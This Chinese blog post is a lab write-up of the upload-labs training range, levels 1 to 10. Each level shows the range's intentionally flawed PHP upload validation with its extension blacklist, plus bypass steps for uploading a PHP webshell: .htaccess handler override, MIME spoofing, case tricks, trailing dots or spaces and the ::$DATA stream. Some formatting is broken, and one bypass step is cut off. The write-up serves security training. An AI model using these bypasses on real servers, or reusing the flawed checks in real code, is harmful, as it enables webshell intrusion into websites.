<!DOCTYPE html>



  


<html class="theme-next pisces use-motion" lang="zh-Hans">
<head><meta name="generator" content="Hexo 3.9.0">
  <meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
<meta name="theme-color" content="#222">









<meta http-equiv="Cache-Control" content="no-transform">
<meta http-equiv="Cache-Control" content="no-siteapp">
















  
  
  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">







<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">

<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">


  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">





  <meta name="keywords" content="CTF,uploads,">










<meta name="description" content="文件上传的目的是通过上传.php文件，从而植入木马，然后通过菜刀进行连接，最终get shell">
<meta name="keywords" content="CTF,uploads">
<meta property="og:type" content="article">
<meta property="og:title" content="upload-labs">
<meta property="og:url" content="http://yoursite.com/2019/09/14/Web/upload-labs/index.html">
<meta property="og:site_name" content="hf1dw&#39;s blogs">
<meta property="og:description" content="文件上传的目的是通过上传.php文件，从而植入木马，然后通过菜刀进行连接，最终get shell">
<meta property="og:locale" content="zh-Hans">
<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/9223646-68bff6eaf56073cd.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/9223646-35b684b78a4b9b44.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
<meta property="og:updated_time" content="2019-09-14T09:31:41.091Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="upload-labs">
<meta name="twitter:description" content="文件上传的目的是通过上传.php文件，从而植入木马，然后通过菜刀进行连接，最终get shell">
<meta name="twitter:image" content="https://upload-images.jianshu.io/upload_images/9223646-68bff6eaf56073cd.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">



<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Pisces',
    version: '5.1.4',
    sidebar: {"position":"right","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
    fancybox: true,
    tabs: true,
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    duoshuo: {
      userId: '0',
      author: 'Author'
    },
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>



  <link rel="canonical" href="http://yoursite.com/2019/09/14/Web/upload-labs/">





  <title>upload-labs | hf1dw's blogs</title>
  








</head>

<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">

  
  
    
  

  <div class="container sidebar-position-right page-post-detail">
    <div class="headband"></div>
	<a href="https://github.com/hf1dw"><img width="100" height="100" src="https://github.blog/wp-content/uploads/2008/12/forkme_right_darkblue_121621.png?resize=149%2C149" class="attachment-full size-full" alt="Fork me on GitHub" data-recalc-dims="1"></a>
    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta ">
    

    <div class="custom-logo-site-title">
      <a href="/" class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">hf1dw's blogs</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
      
        <p class="site-subtitle">studying,reading,thinking</p>
      
  </div>

  <div class="site-nav-toggle">
    <button>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
            Home
          </a>
        </li>
      
        
        <li class="menu-item menu-item-tags">
          <a href="/tags/" rel="section">
            
            Tags
          </a>
        </li>
      
        
        <li class="menu-item menu-item-categories">
          <a href="/categories/" rel="section">
            
            Categories
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives/" rel="section">
            
            Archives
          </a>
        </li>
      
        
        <li class="menu-item menu-item-about">
          <a href="/about/" rel="section">
            
            About
          </a>
        </li>
      

      
    </ul>
  

  
</nav>



 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            

  <div id="posts" class="posts-expand">
    

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/09/14/Web/upload-labs/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="hf1dw">
      <meta itemprop="description" content>
      <meta itemprop="image" content="/images/blog-logo.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="hf1dw's blogs">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">upload-labs</h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-09-14T17:49:46+08:00">
                2019-09-14
              </time>
            

            

            
          </span>

          
            <span class="post-category">
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">In</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/web/" itemprop="url" rel="index">
                    <span itemprop="name">web</span>
                  </a>
                </span>

                
                
                  , 
                
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/web/uploads/" itemprop="url" rel="index">
                    <span itemprop="name">uploads</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        <p><em>文件上传的目的是通过上传.php文件，从而植入木马，然后通过菜刀进行连接，最终get shell</em></p>
<blockquote>
<p><img src="https://upload-images.jianshu.io/upload_images/9223646-68bff6eaf56073cd.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
</blockquote>
<a id="more"></a>

<h4 id="0x01-Pass-01"><a href="#0x01-Pass-01" class="headerlink" title="0x01 Pass-01"></a>0x01 Pass-01</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">function checkFile() &#123;</span><br><span class="line">    var file = document.getElementsByName(&apos;upload_file&apos;)[0].value;</span><br><span class="line">    if (file == null || file == &quot;&quot;) &#123;</span><br><span class="line">        alert(&quot;请选择要上传的文件!&quot;);</span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br><span class="line">    //定义允许上传的文件类型</span><br><span class="line">    var allow_ext = &quot;.jpg|.png|.gif&quot;;</span><br><span class="line">    //提取上传文件的类型</span><br><span class="line">    var ext_name = file.substring(file.lastIndexOf(&quot;.&quot;));</span><br><span class="line">    //判断上传文件类型是否允许上传</span><br><span class="line">    if (allow_ext.indexOf(ext_name + &quot;|&quot;) == -1) &#123;</span><br><span class="line">        var errMsg = &quot;该文件不允许上传，请上传&quot; + allow_ext + &quot;类型的文件,当前文件类型为：&quot; + ext_name;</span><br><span class="line">        alert(errMsg);</span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li><p>拦截方式：根据上传文件的后缀是否为.img格式来判断文件能否上传；</p>
</li>
<li><p>绕过方式：将木马伪装成.img文件，上传后burp拦截数据包，更改文件后缀为.php，再forward.</p>
</li>
</ul>
<h4 id="0x02-Pass-02"><a href="#0x02-Pass-02" class="headerlink" title="0x02 Pass-02"></a>0x02 Pass-02</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = false;</span><br><span class="line">$msg = null;</span><br><span class="line">if (isset($_POST[&apos;submit&apos;])) &#123;</span><br><span class="line">    if (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        if (($_FILES[&apos;upload_file&apos;][&apos;type&apos;] == &apos;image/jpeg&apos;) || ($_FILES[&apos;upload_file&apos;][&apos;type&apos;] == &apos;image/png&apos;) || ($_FILES[&apos;upload_file&apos;][&apos;type&apos;] == &apos;image/gif&apos;)) &#123;</span><br><span class="line">            $temp_file = $_FILES[&apos;upload_file&apos;][&apos;tmp_name&apos;];</span><br><span class="line">            $img_path = UPLOAD_PATH . &apos;/&apos; . $_FILES[&apos;upload_file&apos;][&apos;name&apos;]            </span><br><span class="line">            if (move_uploaded_file($temp_file, $img_path)) &#123;</span><br><span class="line">                $is_upload = true;</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                $msg = &apos;上传出错！&apos;;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $msg = &apos;文件类型不正确，请重新上传！&apos;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        $msg = UPLOAD_PATH.&apos;文件夹不存在,请手工创建！&apos;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li><p>拦截方式：对文件的MIME(Multipurpose Internet Mail Extensions)进行了验证，只允许图片类的MIME类型通过</p>
</li>
<li><p>绕过方式：直接上传木马文件，burp截包，修改Content-Type为image/gif，go….</p>
<blockquote>
<p><img src="https://upload-images.jianshu.io/upload_images/9223646-35b684b78a4b9b44.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
</blockquote>
</li>
</ul>
<h4 id="0x03-Pass-03"><a href="#0x03-Pass-03" class="headerlink" title="0x03 Pass-03"></a>0x03 Pass-03</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = false;</span><br><span class="line">$msg = null;</span><br><span class="line">if (isset($_POST[&apos;submit&apos;])) &#123;</span><br><span class="line">    if (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext = array(&apos;.asp&apos;,&apos;.aspx&apos;,&apos;.php&apos;,&apos;.jsp&apos;);</span><br><span class="line">        $file_name = trim($_FILES[&apos;upload_file&apos;][&apos;name&apos;]);</span><br><span class="line">        $file_name = deldot($file_name);//删除文件名末尾的点</span><br><span class="line">        $file_ext = strrchr($file_name, &apos;.&apos;);</span><br><span class="line">        $file_ext = strtolower($file_ext); //转换为小写</span><br><span class="line">        $file_ext = str_ireplace(&apos;::$DATA&apos;, &apos;&apos;, $file_ext);//去除字符串::$DATA</span><br><span class="line">        $file_ext = trim($file_ext); //收尾去空</span><br><span class="line"></span><br><span class="line">        if(!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            $temp_file = $_FILES[&apos;upload_file&apos;][&apos;tmp_name&apos;];</span><br><span class="line">            $img_path = UPLOAD_PATH.&apos;/&apos;.date(&quot;YmdHis&quot;).rand(1000,9999).$file_ext;            </span><br><span class="line">            if (move_uploaded_file($temp_file,$img_path)) &#123;</span><br><span class="line">                 $is_upload = true;</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                $msg = &apos;上传出错！&apos;;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $msg = &apos;不允许上传.asp,.aspx,.php,.jsp后缀文件！&apos;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        $msg = UPLOAD_PATH . &apos;文件夹不存在,请手工创建！&apos;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li><p>拦截方式：黑名单验证(‘.asp’,’.aspx’,’.php’,’.jsp’)</p>
</li>
<li><p>绕过方式：<br>(1)可上传php3,php5…等这样可以被服务器解析的后缀名<br>(2)重写文件解析规则绕过，先上传一个.htaccess文件，再上传一个1.jpg文件(内含木马)<br>通过.htaccess文件调用php解析器去解析一个文件名中只要包含”1.jpg”这个字符串的任意文件，<br>无论扩展名是什么(没有也行)，都以php的方式来解析<br>.htaccess文件内容：</p>
<figure class="highlight plain"><figcaption><span>"1.jpg">```</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">```SetHandler application/x-httpd-php</span><br></pre></td></tr></table></figure>

</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">#### 0x04 Pass-04</span><br></pre></td></tr></table></figure>

<p>$is_upload = false;<br>$msg = null;<br>if (isset($_POST[‘submit’])) {<br>    if (file_exists(UPLOAD_PATH)) {<br>        $deny_ext = array(“.php”,”.php5”,”.php4”,”.php3”,”.php2”,”php1”,”.html”,”.htm”,”.phtml”,”.pht”,”.pHp”,”.pHp5”,”.pHp4”,”.pHp3”,”.pHp2”,”pHp1”,”.Html”,”.Htm”,”.pHtml”,”.jsp”,”.jspa”,”.jspx”,”.jsw”,”.jsv”,”.jspf”,”.jtml”,”.jSp”,”.jSpx”,”.jSpa”,”.jSw”,”.jSv”,”.jSpf”,”.jHtml”,”.asp”,”.aspx”,”.asa”,”.asax”,”.ascx”,”.ashx”,”.asmx”,”.cer”,”.aSp”,”.aSpx”,”.aSa”,”.aSax”,”.aScx”,”.aShx”,”.aSmx”,”.cEr”,”.sWf”,”.swf”);<br>        $file_name = trim($_FILES[‘upload_file’][‘name’]);<br>        $file_name = deldot($file_name);//删除文件名末尾的点<br>        $file_ext = strrchr($file_name, ‘.’);<br>        $file_ext = strtolower($file_ext); //转换为小写<br>        $file_ext = str_ireplace(‘::$DATA’, ‘’, $file_ext);//去除字符串::$DATA<br>        $file_ext = trim($file_ext); //收尾去空</p>
<pre><code>    if (!in_array($file_ext, $deny_ext)) {
        $temp_file = $_FILES[&apos;upload_file&apos;][&apos;tmp_name&apos;];
        $img_path = UPLOAD_PATH.&apos;/&apos;.date(&quot;YmdHis&quot;).rand(1000,9999).$file_ext;
        if (move_uploaded_file($temp_file, $img_path)) {
            $is_upload = true;
        } else {
            $msg = &apos;上传出错！&apos;;
        }
    } else {
        $msg = &apos;此文件不允许上传!&apos;;
    }
} else {
    $msg = UPLOAD_PATH . &apos;文件夹不存在,请手工创建！&apos;;
}</code></pre><p>}</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">* 拦截方式：对上传文件的后缀名的判断种类增加</span><br><span class="line"></span><br><span class="line">* 绕过方式：重写文件解析规则绕过(第3关(2))</span><br><span class="line"></span><br><span class="line">#### 0x05 Pass-05</span><br></pre></td></tr></table></figure>

<p>$is_upload = false;<br>$msg = null;<br>if (isset($_POST[‘submit’])) {<br>    if (file_exists(UPLOAD_PATH)) {<br>        $deny_ext = array(“.php”,”.php5”,”.php4”,”.php3”,”.php2”,”.html”,”.htm”,”.phtml”,”.pht”,”.pHp”,”.pHp5”,”.pHp4”,”.pHp3”,”.pHp2”,”.Html”,”.Htm”,”.pHtml”,”.jsp”,”.jspa”,”.jspx”,”.jsw”,”.jsv”,”.jspf”,”.jtml”,”.jSp”,”.jSpx”,”.jSpa”,”.jSw”,”.jSv”,”.jSpf”,”.jHtml”,”.asp”,”.aspx”,”.asa”,”.asax”,”.ascx”,”.ashx”,”.asmx”,”.cer”,”.aSp”,”.aSpx”,”.aSa”,”.aSax”,”.aScx”,”.aShx”,”.aSmx”,”.cEr”,”.sWf”,”.swf”,”.htaccess”);<br>        $file_name = trim($_FILES[‘upload_file’][‘name’]);<br>        $file_name = deldot($file_name);//删除文件名末尾的点<br>        $file_ext = strrchr($file_name, ‘.’);<br>        $file_ext = str_ireplace(‘::$DATA’, ‘’, $file_ext);//去除字符串::$DATA<br>        $file_ext = trim($file_ext); //首尾去空</p>
<pre><code>    if (!in_array($file_ext, $deny_ext)) {
        $temp_file = $_FILES[&apos;upload_file&apos;][&apos;tmp_name&apos;];
        $img_path = UPLOAD_PATH.&apos;/&apos;.date(&quot;YmdHis&quot;).rand(1000,9999).$file_ext;
        if (move_uploaded_file($temp_file, $img_path)) {
            $is_upload = true;
        } else {
            $msg = &apos;上传出错！&apos;;
        }
    } else {
        $msg = &apos;此文件类型不允许上传！&apos;;
    }
} else {
    $msg = UPLOAD_PATH . &apos;文件夹不存在,请手工创建！&apos;;
}</code></pre><p>}</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">* 拦截方式：.htaccess加入了黑名单，取消了后缀名全变为小写字母的函数</span><br><span class="line"></span><br><span class="line">* 绕过方式：采用大小写混合方式绕过.Php,.PHp5...</span><br><span class="line"></span><br><span class="line">#### 0x06 Pass-06</span><br></pre></td></tr></table></figure>

<p>$is_upload = false;<br>$msg = null;<br>if (isset($_POST[‘submit’])) {<br>    if (file_exists(UPLOAD_PATH)) {<br>        $deny_ext = array(“.php”,”.php5”,”.php4”,”.php3”,”.php2”,”.html”,”.htm”,”.phtml”,”.pht”,”.pHp”,”.pHp5”,”.pHp4”,”.pHp3”,”.pHp2”,”.Html”,”.Htm”,”.pHtml”,”.jsp”,”.jspa”,”.jspx”,”.jsw”,”.jsv”,”.jspf”,”.jtml”,”.jSp”,”.jSpx”,”.jSpa”,”.jSw”,”.jSv”,”.jSpf”,”.jHtml”,”.asp”,”.aspx”,”.asa”,”.asax”,”.ascx”,”.ashx”,”.asmx”,”.cer”,”.aSp”,”.aSpx”,”.aSa”,”.aSax”,”.aScx”,”.aShx”,”.aSmx”,”.cEr”,”.sWf”,”.swf”,”.htaccess”);<br>        $file_name = $_FILES[‘upload_file’][‘name’];<br>        $file_name = deldot($file_name);//删除文件名末尾的点<br>        $file_ext = strrchr($file_name, ‘.’);<br>        $file_ext = strtolower($file_ext); //转换为小写<br>        $file_ext = str_ireplace(‘::$DATA’, ‘’, $file_ext);//去除字符串::$DATA</p>
<pre><code>    if (!in_array($file_ext, $deny_ext)) {
        $temp_file = $_FILES[&apos;upload_file&apos;][&apos;tmp_name&apos;];
        $img_path = UPLOAD_PATH.&apos;/&apos;.date(&quot;YmdHis&quot;).rand(1000,9999).$file_ext;
        if (move_uploaded_file($temp_file,$img_path)) {
            $is_upload = true;
        } else {
            $msg = &apos;上传出错！&apos;;
        }
    } else {
        $msg = &apos;此文件不允许上传&apos;;
    }
} else {
    $msg = UPLOAD_PATH . &apos;文件夹不存在,请手工创建！&apos;;
}</code></pre><p>}</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">* 题目没有去除文件尾部的空格, 所以使用 burpsuite 抓包文件名添加空格即可绕过.</span><br><span class="line"></span><br><span class="line">#### 0x07 Pass-07</span><br></pre></td></tr></table></figure>

<p>$is_upload = false;<br>$msg = null;<br>if (isset($_POST[‘submit’])) {<br>    if (file_exists(UPLOAD_PATH)) {<br>        $deny_ext = array(“.php”,”.php5”,”.php4”,”.php3”,”.php2”,”.html”,”.htm”,”.phtml”,”.pht”,”.pHp”,”.pHp5”,”.pHp4”,”.pHp3”,”.pHp2”,”.Html”,”.Htm”,”.pHtml”,”.jsp”,”.jspa”,”.jspx”,”.jsw”,”.jsv”,”.jspf”,”.jtml”,”.jSp”,”.jSpx”,”.jSpa”,”.jSw”,”.jSv”,”.jSpf”,”.jHtml”,”.asp”,”.aspx”,”.asa”,”.asax”,”.ascx”,”.ashx”,”.asmx”,”.cer”,”.aSp”,”.aSpx”,”.aSa”,”.aSax”,”.aScx”,”.aShx”,”.aSmx”,”.cEr”,”.sWf”,”.swf”,”.htaccess”);<br>        $file_name = trim($_FILES[‘upload_file’][‘name’]);<br>        $file_ext = strrchr($file_name, ‘.’);<br>        $file_ext = strtolower($file_ext); //转换为小写<br>        $file_ext = str_ireplace(‘::$DATA’, ‘’, $file_ext);//去除字符串::$DATA<br>        $file_ext = trim($file_ext); //首尾去空</p>
<pre><code>    if (!in_array($file_ext, $deny_ext)) {
        $temp_file = $_FILES[&apos;upload_file&apos;][&apos;tmp_name&apos;];
        $img_path = UPLOAD_PATH.&apos;/&apos;.$file_name;
        if (move_uploaded_file($temp_file, $img_path)) {
            $is_upload = true;
        } else {
            $msg = &apos;上传出错！&apos;;
        }
    } else {
        $msg = &apos;此文件类型不允许上传！&apos;;
    }
} else {
    $msg = UPLOAD_PATH . &apos;文件夹不存在,请手工创建！&apos;;
}</code></pre><p>}</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">* 拦截方式：.htaccess加入了黑名单，后缀名全变为小写字母的函数依旧存在</span><br><span class="line"></span><br><span class="line">* 绕过方式：利用windows系统的文件名特性</span><br><span class="line">(不允许有.单独存在),上传1.php，burp截包,将后缀改为1.php .的形式，上传后保存在Windows系统上的文件名最后的一个.会被去掉，实际上保存的文件名就是1.php</span><br><span class="line"></span><br><span class="line">#### 0x08 Pass-08</span><br></pre></td></tr></table></figure>

<p>$is_upload = false;<br>$msg = null;<br>if (isset($_POST[‘submit’])) {<br>    if (file_exists(UPLOAD_PATH)) {<br>        $deny_ext = array(“.php”,”.php5”,”.php4”,”.php3”,”.php2”,”.html”,”.htm”,”.phtml”,”.pht”,”.pHp”,”.pHp5”,”.pHp4”,”.pHp3”,”.pHp2”,”.Html”,”.Htm”,”.pHtml”,”.jsp”,”.jspa”,”.jspx”,”.jsw”,”.jsv”,”.jspf”,”.jtml”,”.jSp”,”.jSpx”,”.jSpa”,”.jSw”,”.jSv”,”.jSpf”,”.jHtml”,”.asp”,”.aspx”,”.asa”,”.asax”,”.ascx”,”.ashx”,”.asmx”,”.cer”,”.aSp”,”.aSpx”,”.aSa”,”.aSax”,”.aScx”,”.aShx”,”.aSmx”,”.cEr”,”.sWf”,”.swf”,”.htaccess”);<br>        $file_name = trim($_FILES[‘upload_file’][‘name’]);<br>        $file_name = deldot($file_name);//删除文件名末尾的点<br>        $file_ext = strrchr($file_name, ‘.’);<br>        $file_ext = strtolower($file_ext); //转换为小写<br>        $file_ext = trim($file_ext); //首尾去空</p>
<pre><code>    if (!in_array($file_ext, $deny_ext)) {
        $temp_file = $_FILES[&apos;upload_file&apos;][&apos;tmp_name&apos;];
        $img_path = UPLOAD_PATH.&apos;/&apos;.date(&quot;YmdHis&quot;).rand(1000,9999).$file_ext;
        if (move_uploaded_file($temp_file, $img_path)) {
            $is_upload = true;
        } else {
            $msg = &apos;上传出错！&apos;;
        }
    } else {
        $msg = &apos;此文件类型不允许上传！&apos;;
    }
} else {
    $msg = UPLOAD_PATH . &apos;文件夹不存在,请手工创建！&apos;;
}</code></pre><p>}</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">* 拦截方式：缺少 ```$file_ext = str_ireplace(&apos;::$DATA&apos;, &apos;&apos;, $file_ext);//去除字符串::$DATA</span><br></pre></td></tr></table></figure>

<ul>
<li>绕过方式：利用windows文件流特性绕过，1.php上传,burp截包,改为<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">#### 0x09 Pass-09</span><br></pre></td></tr></table></figure></li>
</ul>
<p>$is_upload = false;<br>$msg = null;<br>if (isset($_POST[‘submit’])) {<br>    if (file_exists(UPLOAD_PATH)) {<br>        $deny_ext = array(“.php”,”.php5”,”.php4”,”.php3”,”.php2”,”.html”,”.htm”,”.phtml”,”.pht”,”.pHp”,”.pHp5”,”.pHp4”,”.pHp3”,”.pHp2”,”.Html”,”.Htm”,”.pHtml”,”.jsp”,”.jspa”,”.jspx”,”.jsw”,”.jsv”,”.jspf”,”.jtml”,”.jSp”,”.jSpx”,”.jSpa”,”.jSw”,”.jSv”,”.jSpf”,”.jHtml”,”.asp”,”.aspx”,”.asa”,”.asax”,”.ascx”,”.ashx”,”.asmx”,”.cer”,”.aSp”,”.aSpx”,”.aSa”,”.aSax”,”.aScx”,”.aShx”,”.aSmx”,”.cEr”,”.sWf”,”.swf”,”.htaccess”);<br>        $file_name = trim($_FILES[‘upload_file’][‘name’]);<br>        $file_name = deldot($file_name);//删除文件名末尾的点<br>        $file_ext = strrchr($file_name, ‘.’);<br>        $file_ext = strtolower($file_ext); //转换为小写<br>        $file_ext = str_ireplace(‘::$DATA’, ‘’, $file_ext);//去除字符串::$DATA<br>        $file_ext = trim($file_ext); //首尾去空</p>
<pre><code>    if (!in_array($file_ext, $deny_ext)) {
        $temp_file = $_FILES[&apos;upload_file&apos;][&apos;tmp_name&apos;];
        $img_path = UPLOAD_PATH.&apos;/&apos;.$file_name;
        if (move_uploaded_file($temp_file, $img_path)) {
            $is_upload = true;
        } else {
            $msg = &apos;上传出错！&apos;;
        }
    } else {
        $msg = &apos;此文件类型不允许上传！&apos;;
    }
} else {
    $msg = UPLOAD_PATH . &apos;文件夹不存在,请手工创建！&apos;;
}</code></pre><p>}</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">* 本题中的代码后缀名处理的不够严谨, 先去除了文件后面的., 再去除了文件后缀的空格, 由于只处理了一次, 所以可以通过上传1.php. . 原理跟前面几题基本一样.</span><br><span class="line"></span><br><span class="line">#### 0x10 Pass-10</span><br></pre></td></tr></table></figure>

<p>$is_upload = false;<br>$msg = null;<br>if (isset($_POST[‘submit’])) {<br>    if (file_exists(UPLOAD_PATH)) {<br>        $deny_ext = array(“php”,”php5”,”php4”,”php3”,”php2”,”html”,”htm”,”phtml”,”pht”,”jsp”,”jspa”,”jspx”,”jsw”,”jsv”,”jspf”,”jtml”,”asp”,”aspx”,”asa”,”asax”,”ascx”,”ashx”,”asmx”,”cer”,”swf”,”htaccess”);</p>
<pre><code>    $file_name = trim($_FILES[&apos;upload_file&apos;][&apos;name&apos;]);
    $file_name = str_ireplace($deny_ext,&quot;&quot;, $file_name);
    $temp_file = $_FILES[&apos;upload_file&apos;][&apos;tmp_name&apos;];
    $img_path = UPLOAD_PATH.&apos;/&apos;.$file_name;        
    if (move_uploaded_file($temp_file, $img_path)) {
        $is_upload = true;
    } else {
        $msg = &apos;上传出错！&apos;;
    }
} else {
    $msg = UPLOAD_PATH . &apos;文件夹不存在,请手工创建！&apos;;
}</code></pre><p>}</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">* 拦截方式：``` $file_name = str_ireplace($deny_ext,&quot;&quot;, $file_name);```, 作用是把黑名单里面的后缀名替换成空, 由于只替换了一遍, 只对文件名进行了一次过滤，所以可以采用双写绕过。</span><br><span class="line"></span><br><span class="line">* 绕过方式：构造双重文件名,1.phphpp</span><br><span class="line"></span><br><span class="line">#### 0x11 Pass-11</span><br></pre></td></tr></table></figure>

